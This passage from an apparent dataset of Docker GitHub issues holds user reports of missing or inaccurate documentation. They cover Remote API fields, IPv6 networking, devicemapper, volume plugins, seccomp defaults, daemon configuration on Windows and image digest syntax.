filter 'name'\n\n**Describe the results you expected:**\nBased on this https://docs.docker.com/engine/reference/commandline/volume_ls/\n\n| DRIVER | VOLUME NAME |\n| --- | --- |\n| local | rosemary |\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nfilter dangling is working\n"},{"labels":["documentation"],"text":"Given there are apparently duplicate properties at the options level and HostConfig level the lack of documentation for the containers/create endpoint in the [Remote API](https://docs.docker.com/engine/reference/api/docker_remote_api_v1.23/#create-a-container) is a blocker.\n\nIn particular, without deep knowledge of the system, how are adopters supposed to differentiate between...\n\n`options.Volumes` vs. `options.HostConfig.Binds`\n\n...or...\n\n`options.ExposedPorts` vs. `options.HostConfig.PortBindings`\n\n...as they appear to be doing the same thing. Probably they are not, but really as [noted before](https://github.com/docker/docker/issues/2949) in an issue not properly closed according to those in the thread, these things are NOT self-describing. If the conventions correspond to equivalent operations documented elsewhere, then this link should be explicit.\n\nHostConfig is not even labelled - what does it do? Isn't the whole JSON-ish structure a host configuration? This is particularly galling since the /run endpoint describes that it 'takes a HostConfig' for backwards compatibility, and links to the documentation for containers/create to clarify, where there is no information describing what the HostConfig object is for, (versus the whole options object, which contains a bunch of host-specific config).\n\nBACKGROUND\n\nI am trying to execute through the Remote API a self-removing (--rm) container configuration already verified interactively through a command line `docker run` invocation. I can't be the only person who works in this way, starting with docker run, and then trying to use an API to automate invocation. \n\nMy attempt to code this through dockerode (backed by the Remote API) very challenging simply because the documentation is so poor (dockerode points to the Remote API documentation as documentation for its own API). \n"},{"labels":["documentation",null,null],"text":"Kube's is somehow generating docs, I didn't look into the details but it's prettty cool, even if its slow as eff to run (maybe we can make it better, I didn't really dig deep). Then maybe we don't have to think about so many things :)\n\nhttps://github.com/kubernetes/kubernetes/blob/master/hack/update-generated-docs.sh\n"},{"labels":[null,"documentation"],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\nhttps://docs.docker.com/engine/reference/api/docker_remote_api_v1.23\n\nCreate a container -- status codes:\n[mistake] 404: no such container --> image\n[miss] 409: the name \"xxx\" is already in use\n[confuse] 406: impossible to attach.\nHow to trigger a 406 error in a create action?\n\nStart a container -- status codes:\n[mistake] 404: no such container --> can also be \"executable file not found in $PATH\"\n"},{"labels":["documentation",null,null],"text":"I've tried to wrap my head around the [Docker IPv6 cluster documentation](https://docs.docker.com/engine/userguide/networking/default_network/ipv6/), but something does not work out.\n\nIt seems that both graphics for [Switched network environment](https://docs.docker.com/engine/userguide/networking/default_network/images/ipv6_switched_network_example.svg)\n![image](https://cloud.githubusercontent.com/assets/636669/15391455/90ccb634-1dc1-11e6-917f-a1da758b3777.png)\nand [Routed network environment](https://docs.docker.com/engine/userguide/networking/default_network/images/ipv6_routed_network_example.svg)\n![image](https://cloud.githubusercontent.com/assets/636669/15391479/aa4a9cfc-1dc1-11e6-8a56-db728d0be83e.png)\n are identical (beside some typos) and are not helping with my issue.\n\nMy use case:\n\nI have a /48 network (`2001:XXXX:45::/48`) and routed two /64 subnetworks (`2001:XXXX:45:2::/64` and `2001:XXXX:45:3::/64`) to my host and assigned one of it to the host and the other to the containers. So Host1 has\n\n```\n$ # ip -6 addr\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qlen 1000\n    inet6 2001:XXXX:45:2::2/64 scope global\n       valid_lft forever preferred_lft forever\n    inet6 fe80::ec4:7aff:fe06:5830/64 scope link\n       valid_lft forever preferred_lft forever\n181: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500\n    inet6 2001:XXXX:45:3::1/64 scope global tentative\n       valid_lft forever preferred_lft forever\n    inet6 fe80::1/64 scope link tentative\n       valid_lft forever preferred_lft forever\n\n\n$ ip -6 route\n2001:XXXX:45:2::/64 dev eth0  proto kernel  metric 256\n2001:XXXX:45:3::/64 dev docker0  proto kernel  metric 256\n2001:XXXX:45:3::/64 dev docker0  metric 1024\nfe80::223:9cff:fefc:6ff0 dev eth0  metric 1024\nfe80::/64 dev eth0  proto kernel  metric 256\nfe80::/64 dev docker0  proto kernel  metric 256\ndefault via fe80::223:9cff:fefc:6ff0 dev eth0  metric 1024\n```\n\nwhile Container1-1, Container1-2, Container1-X get started with\n\n```\nDOCKER_OPTS=\"--dns 8.8.8.8 --dns 8.8.4.4 --fixed-cidr-v6=2001:XXXX:45:3::/64 --ipv6\"\n```\n\nand result in this\n\n```\n$ docker run -it ubuntu:14.04 bash -c 'ip -6 addr; echo '====' ; ip -6 route'\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n190: eth0: <NO-CARRIER,BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet6 2001:XXXX:45:3:0:242:ac11:2/64 scope global nodad\n       valid_lft forever preferred_lft forever\n    inet6 fe80::42:acff:fe11:2/64 scope link tentative\n       valid_lft forever preferred_lft forever\n====\n2001:XXXX:45:3::/64 dev eth0  proto kernel  metric 256\nfe80::/64 dev eth0  proto kernel  metric 256\ndefault via 2001:XXXX:45:3::1 dev eth0  metric 1024\n```\n\nMy issue is: I can't make this work without a NDP proxy on the host. The containers are not able to reach outside world, unless i manually add a NDP proxy on my host, e.g.:\n\n```\n$ sysctl net.ipv6.conf.eth0.proxy_ndp=1\n$ ip -6 neigh add proxy 2001:XXXX:45:3:0:242:ac11:2 dev eth0\n```\n\nWhat am i missing? The documentation gives the impression that NDP proxying is only necessary if using a single /64 - and switches/routed environments should work without NDP proxy.\n"},{"labels":["documentation",null],"text":"Referring to #22166\n\nThe [last commit of the device-mapper documentation](https://github.com/docker/docker/commit/a7b2f87b0637a3711e90c0f1d0a99dd5d32bd60f#diff-52525eec69924c13d098f5d19b2d79adL254) by @chenchun clarified the overall use.\nBut as I go through the steps, I'm missing the part where the thinpool configuration on /data and /metadata is done.\n\nThe [diff shows that the previous version ](https://github.com/docker/docker/pull/22662/commits/3cf8c53515ff8144a63c6d4418738b5d4f4416a7)had this covered in lines 254 and following\n"},{"labels":[null,"documentation",null,null],"text":"Currently it seems very hard to find any documentation on what kind of security is promised by Dockerfile execution, especially if building Dockerfiles from untrusted sources.\n\nAs far as I can gather, the security is as follows:\n- context directory contents are available, but there is no access to files outside it\n- full access to network is available as if running an untrusted docker image\n- escalating access to host is prevented with the same strength as normal untrusted docker images\n- resource constraints are given in docker build command line\n\nThis means that if these limitations are acceptable, it is possible to allow building Dockerfiles from untrusted sources without creating a separate VM or similar to contain the build.\n\nI assume something like this is already done by Docker Hub when builds are submitted to it, as it probably does not use a separate VM for each build, so the priviledge separation probably has been tested quite rigorously.\n\nIs my assessment correct? Should this be explicitly documented somewhere?\n"},{"labels":["documentation",null],"text":"This document discusses two image tags that do not exist on the hub (https://hub.docker.com/r/docker/trusttest/tags/).\n\nhttps://github.com/docker/docker/blob/861815a3252b88a118a91a164246401fa24fa549/docs/security/trust/content_trust.md\n\n```\ndocker pull --disable-content-trust docker/trusttest:untrusted\nPulling repository docker.io/docker/trusttest\nTag untrusted not found in repository docker.io/docker/trusttest\n```\n\n```\ndocker pull docker/seaside\nUsing default tag: latest\nPulling repository docker.io/docker/seaside\nError: image docker/seaside not found\n```\n\nI'm guessing docker/trusttest:untrusted has become docker/trusttest:latest.  docker/seaside seems to have been removed.\n"},{"labels":["documentation",null],"text":"The current text:\n\n> when that variable’s current value is passed through (i.e. `$MYVAR1` from the host is set to `$MYVAR1` in the container).\n\ncould be usefully be changed to:\n\n> when that variable’s current value, set via `export`, is passed through (i.e. `$MYVAR1` from the host is set to `$MYVAR1` in the container, where `export MYVAR1=\"foo\"` was used).\n"},{"labels":["documentation",null,null],"text":"The list of allowed configuration options in [this document](https://docs.docker.com/engine/reference/commandline/daemon/#daemon-configuration-file) is not applicable to Windows. Several of the options do not work on Windows. I think this requires minor clarification, perhaps a sample that is applicable to Windows:\n\nWhen used as is, the following is returned:\n\n``` none\nPS C:\\> dockerd\ntime=\"2016-05-12T15:40:59-07:00\" level=fatal msg=\"unable to configure the Docker daemon with file C:\\\\ProgramData\\\\docker\\\\config\\\\daemon.json: the following directives don't match any configuration option: iptables, bip, icc, api-cors-headers, exec-root, default-gateway-v6, ipv6, cgroup-parent, ip-mask, ip, userland-proxy, default-gateway, ip-forward, selinux-enabled, userns-remap, fixed-cidr-v6\\n\"\n```\n\nHere is a working sample:\n\n``` json\n{\n    \"authorization-plugins\": [],\n    \"dns\": [],\n    \"dns-opts\": [],\n    \"dns-search\": [],\n    \"exec-opts\": [],\n    \"storage-driver\": \"\",\n    \"storage-opts\": [],\n    \"labels\": [],\n    \"log-driver\": \"\", \n    \"mtu\": 0,\n    \"pidfile\": \"\",\n    \"graph\": \"\",\n    \"cluster-store\": \"\",\n    \"cluster-advertise\": \"\",\n    \"debug\": true,\n    \"hosts\": [\"tcp://0.0.0.0:2376\", \"npipe://\"],\n    \"log-level\": \"\",\n    \"tlsverify\": true,\n    \"tlscacert\": \"C:\\\\ProgramData\\\\docker\\\\certs.d\\\\ca.pem\",\n    \"tlscert\": \"C:\\\\ProgramData\\\\docker\\\\certs.d\\\\server-cert.pem\",\n    \"tlskey\": \"C:\\\\ProgramData\\\\docker\\\\certs.d\\\\server-key.pem\",\n    \"group\": \"\",\n    \"default-ulimits\": {},\n    \"bridge\": \"\",\n    \"fixed-cidr\": \"\",\n    \"raw-logs\": false,\n    \"registry-mirrors\": [],\n    \"insecure-registries\": [],\n    \"disable-legacy-registry\": false\n}\n\n```\n\nIf this makes sense, and is in line with the docs scope / purpose, I am happy write up and propose the changes.\n\nneilp\n"},{"labels":["documentation",null,null],"text":"Hi fellow volume plugin developers!\n\nI'm currenty writing my first volume plugin and I have some questions that are not really answered in the API documentation. I will send a pull request that clarifies these points because I think it will also help others:\n\nOn .Create I create a special device, let's call it /dev/specialdev_name and put a file system on top of it.\nOn .Mount I mount it and reference count for the name. The first .Mount really mounts the file system, further .Mounts increase the refcount.\nOn .Umount I decrease the refcount and if 0, I umount the /dev/specialdev_name\nOn .Remove I remove the /dev/specialdev_name if the refcount is 0/is not mounted, otherwise I set Err.\n\nSo far so easy, the problem are .Path (and .Get and .List). To me it is not clear how to react if a volume is known to the driver (i.e., it was created with .Create), but is currently _not_ mounted. Should I report the \"Mountpoint\" where it will be available after a .Mount, or set \"Err\"? The same question applies for .Get. For .List it seams that I should include volumes known but not mounted, otherwise they don't show up in \"docker volume ls\". But yeah, it all boils down to this \"known to the plugin and created, but currently not mounted\" situation. Set Mountpoint to where it will be available after .Mount? Or set Mountpoint to \"\"? Or even set Err?\n"},{"labels":["documentation"],"text":"**Output of `docker version`:**\n\n```\nDocker version 1.11.1, build 5604cbe\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 0\n Running: 0\n Paused: 0\n Stopped: 0\nImages: 1\nServer Version: 1.11.1\nStorage Driver: devicemapper\n Pool Name: docker-253:0-394509-pool\n Pool Blocksize: 65.54 kB\n Base Device Size: 10.74 GB\n Backing Filesystem: xfs\n Data file: /dev/loop0\n Metadata file: /dev/loop1\n Data Space Used: 19.07 MB\n Data Space Total: 107.4 GB\n Data Space Available: 38.76 GB\n Metadata Space Used: 589.8 kB\n Metadata Space Total: 2.147 GB\n Metadata Space Available: 2.147 GB\n Udev Sync Supported: true\n Deferred Removal Enabled: false\n Deferred Deletion Enabled: false\n Deferred Deleted Device Count: 0\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\n WARNING: Usage of loopback devices is strongly discouraged for production use. Either use `--storage-opt dm.thinpooldev` or use `--storage-opt dm.no_warn_on_loop_devices=true` to suppress this warning.\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\n Library Version: 1.02.107-RHEL7 (2015-12-01)\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins: \n Volume: local\n Network: bridge null host\nKernel Version: 3.10.0-327.13.1.el7.x86_64\nOperating System: CentOS Linux 7 (Core)\nOSType: linux\nArchitecture: x86_64\nCPUs: 2\nTotal Memory: 1.797 GiB\nName: localhost.localdomain\nID: E3X2:DQ6O:DVIO:2NPO:XFY7:6P65:SQG2:TXLM:EERQ:GFSO:NUWT:JF3S\nDocker Root Dir: /var/lib/docker\nDebug mode (client): false\nDebug mode (server): false\nRegistry: https://index.docker.io/v1/\nWARNING: bridge-nf-call-iptables is disabled\nWARNING: bridge-nf-call-ip6tables is disabled\n\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):** Vagrant centos/7 box\n\n**Steps to reproduce the issue:**\n1. Start docker as a bootstrap service in one console:\n\n```\ndocker daemon \\\n        -H unix:///var/run/docker-bootstrap.sock \\\n        -p /var/run/docker-bootstrap.pid \\\n        --iptables=false \\\n        --ip-masq=false \\\n        --bridge=none \\\n        --graph=/var/lib/docker-bootstrap --debug\n```\n1. Start container in second console:\n\n```\ndocker -H unix:///var/run/docker-bootstrap.sock run -it --rm busybox sh\n```\n\n**Describe the results you received:**\n\n```\nStatus: Downloaded newer image for busybox:latest\ndocker: Error response from daemon: rpc error: code = 2 desc = \"oci runtime error: rootfs (\\\"/var/lib/docker-bootstrap/devicemapper/mnt/8c8cc49901da0ddbdd24298a7b294dc7a516a9c72d05055fd882964101f46897/rootfs\\\") does not exist\".\n```\n\n**Excerpts from docker daemon logs with debugs enabled**\n\n```\nDEBU[0044] Calling POST /v1.23/containers/create        \nDEBU[0044] form data: {\"AttachStderr\":true,\"AttachStdin\":true,\"AttachStdout\":true,\"Cmd\":[\"sh\"],\"Domainname\":\"\",\"Entrypoint\":null,\"Env\":[],\"HostConfig\":{\"AutoRemove\":false,\"Binds\":null,\"BlkioBps\":0,\"BlkioDeviceReadBps\":null,\"BlkioDeviceReadIOps\":null,\"BlkioDeviceWriteBps\":null,\"BlkioDeviceWriteIOps\":null,\"BlkioIOps\":0,\"BlkioWeight\":0,\"BlkioWeightDevice\":null,\"CapAdd\":null,\"CapDrop\":null,\"Cgroup\":\"\",\"CgroupParent\":\"\",\"ConsoleSize\":[0,0],\"ContainerIDFile\":\"\",\"CpuCount\":0,\"CpuPercent\":0,\"CpuPeriod\":0,\"CpuQuota\":0,\"CpuShares\":0,\"CpusetCpus\":\"\",\"CpusetMems\":\"\",\"Devices\":[],\"DiskQuota\":0,\"Dns\":[],\"DnsOptions\":[],\"DnsSearch\":[],\"ExtraHosts\":null,\"GroupAdd\":null,\"IpcMode\":\"\",\"Isolation\":\"\",\"KernelMemory\":0,\"Links\":null,\"LogConfig\":{\"Config\":{},\"Type\":\"\"},\"Memory\":0,\"MemoryReservation\":0,\"MemorySwap\":0,\"MemorySwappiness\":-1,\"NetworkMode\":\"default\",\"OomKillDisable\":false,\"OomScoreAdj\":0,\"PidMode\":\"\",\"PidsLimit\":0,\"PortBindings\":{},\"Privileged\":false,\"PublishAllPorts\":false,\"ReadonlyRootfs\":false,\"RestartPolicy\":{\"MaximumRetryCount\":0,\"Name\":\"no\"},\"SandboxSize\":0,\"SecurityOpt\":null,\"ShmSize\":0,\"StorageOpt\":null,\"UTSMode\":\"\",\"Ulimits\":null,\"UsernsMode\":\"\",\"VolumeDriver\":\"\",\"VolumesFrom\":null},\"Hostname\":\"\",\"Image\":\"busybox\",\"Labels\":{},\"NetworkingConfig\":{\"EndpointsConfig\":{}},\"OnBuild\":null,\"OpenStdin\":true,\"StdinOnce\":true,\"Tty\":true,\"User\":\"\",\"Volumes\":{},\"WorkingDir\":\"\"} \nDEBU[0044] devmapper: AddDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init basehash=a88c80f3742d46b2f22e9c41acb7d4ca83c59054bbe8efdd7f196b7d5f8a7ca3) \nDEBU[0044] devmapper: registerDevice(17, 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0044] devmapper: AddDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init basehash=a88c80f3742d46b2f22e9c41acb7d4ca83c59054bbe8efdd7f196b7d5f8a7ca3) END \nDEBU[0044] devmapper: activateDeviceIfNeeded(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0044] devmapper: UnmountDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0044] devmapper: Unmount(/var/lib/docker-bootstrap/devicemapper/mnt/35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: Unmount done                      \nDEBU[0045] devmapper: deactivateDevice(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: removeDevice START(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: removeDevice END(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: deactivateDevice END(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: UnmountDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) END \nDEBU[0045] devmapper: AddDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032 basehash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: registerDevice(18, 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: AddDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032 basehash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) END \nDEBU[0045] devmapper: activateDeviceIfNeeded(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] container mounted via layerStore: /var/lib/docker-bootstrap/devicemapper/mnt/35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032/rootfs \nDEBU[0045] devmapper: UnmountDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: Unmount(/var/lib/docker-bootstrap/devicemapper/mnt/35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: Unmount done                      \nDEBU[0045] devmapper: deactivateDevice(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: removeDevice START(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: removeDevice END(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: deactivateDevice END(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: UnmountDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) END \nDEBU[0045] Calling POST /v1.23/containers/f5ff62db4ba13a71321d8d5ea77e7c5990617de72214c417b441a63d1651c16b/attach?stderr=1&stdin=1&stdout=1&stream=1 \nDEBU[0045] attach: stdin: begin                         \nDEBU[0045] attach: stdout: begin                        \nDEBU[0045] attach: stderr: begin                        \nDEBU[0045] Calling POST /v1.23/containers/f5ff62db4ba13a71321d8d5ea77e7c5990617de72214c417b441a63d1651c16b/start \nDEBU[0045] devmapper: activateDeviceIfNeeded(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] container mounted via layerStore: /var/lib/docker-bootstrap/devicemapper/mnt/35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032/rootfs \nDEBU[0045] devmapper: UnmountDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: Unmount(/var/lib/docker-bootstrap/devicemapper/mnt/35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] attach: stdout: end                          \nDEBU[0045] attach: stdin: end                           \nDEBU[0045] attach: stderr: end                          \nDEBU[0045] devmapper: Unmount done                      \nDEBU[0045] devmapper: deactivateDevice(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: removeDevice START(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: removeDevice END(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: deactivateDevice END(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: UnmountDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) END \nERRO[0045] Handler for POST /v1.23/containers/f5ff62db4ba13a71321d8d5ea77e7c5990617de72214c417b441a63d1651c16b/start returned error: rpc error: code = 2 desc = \"oci runtime error: rootfs (\\\"/var/lib/docker-bootstrap/devicemapper/mnt/35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032/rootfs\\\") does not exist\" \nDEBU[0045] Calling DELETE /v1.23/containers/f5ff62db4ba13a71321d8d5ea77e7c5990617de72214c417b441a63d1651c16b?v=1 \nDEBU[0045] devmapper: DeleteDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032 syncDelete=false) START \nDEBU[0045] devmapper: issueDiscard(device: 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032). START \nDEBU[0045] devmapper: activateDeviceIfNeeded(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: issueDiscard(device: 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032). END \nDEBU[0045] devmapper: deactivateDevice(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: removeDevice START(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: removeDevice END(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: deactivateDevice END(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: unregisterDevice(18, 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032) \nDEBU[0045] devmapper: DeleteDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032 syncDelete=false) END \nDEBU[0045] devmapper: DeleteDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init syncDelete=false) START \nDEBU[0045] devmapper: issueDiscard(device: 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init). START \nDEBU[0045] devmapper: activateDeviceIfNeeded(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: issueDiscard(device: 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init). END \nDEBU[0045] devmapper: deactivateDevice(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: removeDevice START(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: removeDevice END(docker-253:0-394747-35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: deactivateDevice END(35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: unregisterDevice(17, 35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init) \nDEBU[0045] devmapper: DeleteDevice(hash=35599f75db637c6ccb495551f4fbec98e105bf273d348d137d506d38527d4032-init syncDelete=false) END \nDEBU[0045] Closing buffered stdin pipe         \n```\n"},{"labels":[null,"documentation",null],"text":"I understand that the manifest format introduced in v1.10 includes the digest of every image layer, and that the Docker Daemon verifies the digest of every image layer on pull (regardless of whether the image is specified by tag or by digest).\n\nThis very important information seems to be absent from all public-facing docs I've been able to find -- e.g. https://docs.docker.com/engine/reference/api/docker_remote_api_v1.22/\n\nI'd appreciate a pointer to anything public-facing that does state this.  Thanks.\n"},{"labels":["documentation"],"text":"I was just looking into CVE-2015-5157. It seems to be a problem because modify_ldt syscall is allowed by default (https://github.com/docker/docker/blob/master/profiles/seccomp/default.json).\n\nHowever, on the docs page it says it should be blocked by default (https://docs.docker.com/engine/security/seccomp/) because \"Old syscall only used in 16-bit code and a potential information leak.\" which sounds like a sensible reason.\n\nSo why is the call allowed in default.json? \n"},{"labels":["documentation"],"text":"The argument to `--config` misbehave in those cases:\n\n`--config ~/.docker/` -> path is expanded by the shell and the config will be `/home/$USER/.docker/`\n`--config=~/.docker/` -> path is **not** expanded and the config will be at `~/.docker/`\n`--config=\"~/.docker/\"` -> path is **not** expanded and the config will be at `~/.docker/`\n`--config='~/.docker/'` -> path is **not** expanded and the config will be at `~/.docker/`\n\nSo the only thing which works is only the first case.\n\nYou can try it out playing around with `--config` and `--attach` for instance.\n1. Specify `detachKeys` in your `~/.docker/config.json` file\n   \n    `\"detachKeys\": \"ctrl-e,e\"`\n2. run a container with `-dit`\n3. attach to this container specifying `--config=~/.docker/`\n4. try to detach with the above sequence - it won't work\n5. try the other failing case above\n6. try with the first, working, case above where there's no `=` sign\n\nSo, the problem seems to be that `=` sign and shell expansion. Any other _relative_ path will fail the above cases of course (`../` for instance)\nNot sure what to do other that checking that the path is relative and warning the user.\n\nping @tianon @vdemeester @calavera @cpuguy83 @thaJeztah \n"},{"labels":["documentation"],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Output of `docker version`:**\n\n```\nDocker version 1.10.2, build c3959b1\n```\n\n**Steps to reproduce the issue:**\n1. Create the Dockerfile as specified in docs/admin/using_supervisord.md and the supervisors.conf\n2. Run docker build  --no-cache  -t <your name here>/supervisord .\n\n**Describe the results you received:**\nFailed to fetch http://archive.ubuntu.com/ubuntu/dists/raring/main/source/Sources  404  Not Found [IP: 91.189.91.23 80]\n\n**Describe the results you expected:**\n\nExpected the container to be built successfully\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n\nLooks as though ubuntu:13.04 repositories are no longer available. Changing the container to ubuntu:15.04 allowed the docker build to run successfully\n"},{"labels":["documentation",null],"text":"I had some trouble working out the correct way to use `docker run` with the sha256 digest. I found the documentation a little confusing with regard to this. For example the [run reference page](https://docs.docker.com/engine/reference/run) has the following example:\n\n```\n$ docker run [OPTIONS] IMAGE[:TAG|@DIGEST] [COMMAND] [ARG...]\n```\n\nHowever I had problems trying to run my image this way. For example:\n\n``` bash\ndocker run namespace/image@digest # Wrong - parse error\ndocker run namespace/image@sha256:digest # Correct\n```\n\nI had to work this out from trial and error. The link to the [Image[@digest]](https://docs.docker.com/engine/reference/run/#image-digest) section anchor doesn't have an example, which I think might have been useful. I believe therefore it might be beneficial to update the documentation regarding using digests.\n\nI suggest the **General Form** section to be:\n\n```\n$ docker run [OPTIONS] IMAGE[:TAG|@sha256:DIGEST] [COMMAND] [ARG...]\n```\n\nIf there are other possible digests, then sha256 could be changed to DIGEST_TYPE or something similar.\n\nSecondly I suggest that the [Image[@digest]](https://docs.docker.com/engine/reference/run/#image-digest) anchor have the following example of using the digest:\n\n```\ndocker run alpine@sha256:9cacb71397b640eca97488cf08582ae4e4068513101088e9f96c9814bfda95e0 date\n```\n\nThis is my feedback from initially trying to get digests to run with `docker run`. If this was confusing to me, it might possibly be confusing to other users.\n"},{"labels":["documentation"],"text":"The the Docker Remote API v1.24 (https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.24.md), the REST function,\n\nTag an image into a repository\n\ndoes not really explain what the function does.\n"},{"labels":[null,"documentation"],"text":"1 - Image ID\n\nThe spec defines “Image ID”, but then explains what a layer ID is. An image is not a layer - an image is a set of layers (per the definition of “Layer” in the same document).\n\n2 - Tag\n\nThe spec defines “Tag” as,\n\n\"A tag serves to map a descriptive, user-given name to any single image ID. An image name suffix (the name component after :) is often referred to as a tag as well, though it strictly refers to the full name of an image.\"\n\na. This is ambiguous, because the term “image ID” is ambiguous, as a result of #1.\n\nb. The term “full name of an image” is ambiguous. Does it include the namespace? The hostname/port of the registry? 